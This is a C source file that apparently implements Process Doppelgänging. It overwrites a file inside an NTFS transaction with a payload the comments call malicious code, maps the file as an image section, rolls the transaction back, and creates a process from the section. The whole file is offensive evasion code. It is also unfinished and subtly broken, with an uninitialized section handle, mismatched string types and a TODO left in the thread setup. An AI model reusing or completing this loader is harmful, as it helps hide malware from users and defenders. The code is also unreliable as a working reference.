#include <Windows.h>
#include <ktmw32.h>
#include <stdio.h>

#include "proc_dopp.h"

#pragma comment(lib, "KtmW32.lib")

void fatal_error(char *msg)
{
	printf("[-] Error : %s\n", msg);
	exit(EXIT_FAILURE);
}

/*
 * Open a file and read its content to copy it into memory.
 * Returns a pointer to the allocated buffer, and its size in the corresponding parameter.
 */
LPVOID file_to_buffer(LPWSTR payload, LPDWORD payloadSize)
{
	HANDLE hPayloadFile;
	HANDLE hHeap;
	LPVOID lpPayloadBuffer;
	DWORD bytesRead = 0;

	// Open the payload file.
	hPayloadFile = CreateFile(
		payload,
		GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (INVALID_HANDLE_VALUE == hPayloadFile)
		fatal_error("failed to open payload file.");

	if (!GetFileSizeEx(hPayloadFile, payloadSize))
		fatal_error("GetFileSizeEx() returns 0.");

	// Allocate memory for the file.
	if ( !(hHeap = GetProcessHeap()) )
		fatal_error("GetProcessHeap() failed.");

	lpPayloadBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, *payloadSize);
	if (!lpPayloadBuffer)
		fatal_error("HeapAlloc() failed.");

	// Put file content into memory.
	if ( !ReadFile(hPayloadFile, lpPayloadBuffer, *payloadSize, &bytesRead, NULL) )
		fatal_error("ReadFile() failed.");

	CloseHandle(hPayloadFile);

	return lpPayloadBuffer;
}

int main(void)
{
	LPWSTR targetProcess = "C:\\Users\\wvbox\\Desktop\\calc_64.exe";
	LPWSTR payload = "C:\\Users\\wvbox\\Desktop\\procexp64.exe";
	HMODULE hNtdll;
	HANDLE hTransaction;
	HANDLE hTransactedFile;
	HANDLE hSection;
	HANDLE hProcess;
	HANDLE hThread;
	LPVOID lpPayloadBuffer;
	DWORD payloadSize;
	DWORD bytesWritten;

	NTSTATUS status;
	NT_CREATE_SECTION _ntCreateSection;
	NT_CREATE_PROCESS_EX _ntCreateProcessEx;
	NT_CREATE_THREAD_EX _ntCreateThreadEx;

	hNtdll = GetModuleHandle("ntdll.dll");

	// Create a transaction.
	hTransaction = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
	if (INVALID_HANDLE_VALUE == hTransaction)
		fatal_error("CreateTransaction() failed.");

	// Open a transacted file (the target clean process).
	hTransactedFile = CreateFileTransacted(
		targetProcess, 
		GENERIC_READ | GENERIC_WRITE, 
		0, 
		NULL,  
		CREATE_ALWAYS, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL, 
		hTransaction, 
		NULL, 
		NULL
	);
	if (INVALID_HANDLE_VALUE == hTransactedFile)
		fatal_error("CreateFileTransactionA() failed.");

	// Overwrite the file with malicious code.
	lpPayloadBuffer = file_to_buffer(payload, &payloadSize);
	printf("Size of the payload buffer : %d\n", payloadSize);
	printf("Buffer : \n%s\n", lpPayloadBuffer);
	getchar();

	WriteFile(hTransactedFile, lpPayloadBuffer, payloadSize, &bytesWritten, NULL);

	// Create the section in the target process.
	_ntCreateSection = (NT_CREATE_SECTION)GetProcAddress(hNtdll, "NtCreateSection");
	status = 0;
	if (_ntCreateSection)
	{
		status = _ntCreateSection(
			hSection,
			SECTION_ALL_ACCESS,
			NULL,
			0,
			PAGE_READONLY,
			SEC_IMAGE,
			hTransactedFile
		);
	}
	if (STATUS_SUCCESS != status)
		fatal_error("NtCreateSection() failed.");

	// Rollback the transaction to remove our changes from the file system.
	if (!RollbackTransaction(hTransaction))
		fatal_error("RollbackTransaction() failed.");

	// Create a new process to wrap the previously created section.
	_ntCreateProcessEx = (NT_CREATE_PROCESS_EX)GetProcAddress(hNtdll, "NtCreateProcessEx");
	status = 0;
	if (_ntCreateProcessEx)
	{
		status = _ntCreateProcessEx(
			&hProcess,
			PROCESS_ALL_ACCESS,
			NULL,
			GetCurrentProcess(),
			PS_INHERIT_HANDLES,
			hSection,
			NULL,
			NULL,
			FALSE
		);
	}
	if (STATUS_SUCCESS != status)
		fatal_error("NtCreateProcessEx() failed.");

	// Create the main thread for the new process.
	_ntCreateThreadEx = (NT_CREATE_THREAD_EX)GetProcAddress(hNtdll, "NtCreateThreadEx");
	status = 0;
	if (_ntCreateThreadEx)
	{
		status = _ntCreateThreadEx(
			&hThread,
			THREAD_ALL_ACCESS,
			NULL,
			hProcess,
			// TODO : understand the process/thread parameter setup,
			NULL,
			FALSE,
			0,
			0,
			0,
			NULL
		);
	}
	if (STATUS_SUCCESS != status)
		fatal_error("NtCreateThreadEx() failed.");

	/*
	RtlCreateProcessParameters();

	VirtualAllocEx();
	WriteProcessMemory(RemoteProcessParams);
	WriteProcessMemory(RemotePEB.ProcessParameters);

	NtResumeThread();
	*/

	return 0;
}